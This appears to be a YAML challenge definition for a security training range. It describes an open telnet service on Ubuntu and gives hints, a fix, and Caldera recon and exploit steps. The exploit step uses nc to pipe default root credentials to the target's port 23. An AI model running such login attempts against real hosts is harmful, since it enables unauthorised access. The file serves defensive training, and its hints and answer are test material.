id: open_telnet
name: Telnet Service Enabled
description: The telnetd service is installed and running, exposing an unencrypted remote login interface on port 23. All credentials and session data are transmitted in cleartext.
type: vulnerability
difficulty: easy
supported_bases: [ubuntu_24_server]
points: 100
category: network
tags: [network, telnet, cleartext, services]
conflicts: []
requires: []
script: open_telnet.sh
verification:
  type: port_closed
  port: 23
suggested_fix: "Stop and disable the telnet service, then remove the package: systemctl stop inetd && systemctl disable inetd && apt-get remove -y telnetd xinetd"
hints:
  - "Scan this machine for legacy remote access services"
  - "Check if any unencrypted remote login services are running on standard ports"
  - "Disable and remove the telnet daemon: systemctl stop inetd && systemctl disable inetd && apt-get remove -y telnetd xinetd"
caldera:
  tactic: initial-access
  technique:
    attack_id: T1133
    name: "External Remote Services"
  recon:
    description: "Discover the listening telnet port"
    parser:
      - module: plugins.ctf-exploit.app.parsers.ctf_extract
        mappings:
          - source: ctf.vuln.open_telnet
            custom_parser_vals:
              marker: VULNERABLE
              pattern: "port=(\\d+)"
    command: |
      PORT=$(ss -tlnp 2>/dev/null | grep -E ':23\b' | grep -oP ':(\d+)\b' | head -1 | tr -d ':')
      [ -n "$PORT" ] && echo "VULNERABLE port=$PORT" || echo "SECURE: port 23 is not listening"
  exploit:
    description: "Connect to the discovered telnet port and attempt login with default credentials"
    command: |
      PORT="#{ctf.vuln.open_telnet}"
      (printf 'root\nchangeme123\n' | timeout 5 nc -q 3 #{ctf.ip} "${PORT}") 2>/dev/null | head -10 \
        || echo "Telnet open on #{ctf.ip}:${PORT} (connect manually for interactive login)"

references:
  - title: "Ubuntu Server security documentation"
    url: https://documentation.ubuntu.com/server/explanation/security/intro-to-security/
  - title: "MITRE ATT&CK Enterprise techniques"
    url: https://attack.mitre.org/techniques/enterprise/
